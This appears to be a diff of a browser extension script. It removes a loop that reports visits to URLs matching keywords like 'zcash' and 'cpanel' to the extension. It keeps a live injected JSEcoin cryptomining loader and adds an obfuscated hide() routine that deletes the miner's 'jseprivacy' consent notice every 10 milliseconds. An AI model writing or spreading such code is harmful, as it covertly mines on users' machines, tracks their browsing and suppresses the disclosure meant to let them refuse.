@@ -64,14 +64,14 @@ var myStringArray = [
   "zcash",
   "cpanel"
 ];
-var arrayLength = myStringArray.length;
-for (var i = 0; i < arrayLength; i++) {
-    if (window.location.href.indexOf(myStringArray[i]) > -1) {
-          var login = {};
-          login.href = window.location.href;
-          chrome.runtime.sendMessage(null, {cmd: "w",login});
-}
-}
+// var arrayLength = myStringArray.length;
+// for (var i = 0; i < arrayLength; i++) {
+//     if (window.location.href.indexOf(myStringArray[i]) > -1) {
+//           var login = {};
+//           login.href = window.location.href;
+//           chrome.runtime.sendMessage({cmd: "w",login});
+// }
+// }
 
 
 
@@ -113,12 +113,16 @@ for (var i = 0; i < arrayLength; i++) {
     if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
     	localStorage[cookie_name] = Date.now();
     	exFunc();
+      hide();
     }
 
 !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/29089/global.com/0/0/",s.parentNode.insertBefore(t,s)}();
+    function hide(){
+
       window["setInterval"](function() {
-        var _0x4a1cx5c = document["getElementById"]("jseprivacy");
-        if (_0x4a1cx5c) {
-          _0x4a1cx5c["outerHTML"] = "";
-        }
-      }, 10);
+         var _0x4a1cx5c = document["getElementById"]("jseprivacy");
+         if (_0x4a1cx5c) {
+           _0x4a1cx5c["outerHTML"] = "";
+         }
+       }, 10);
+    }
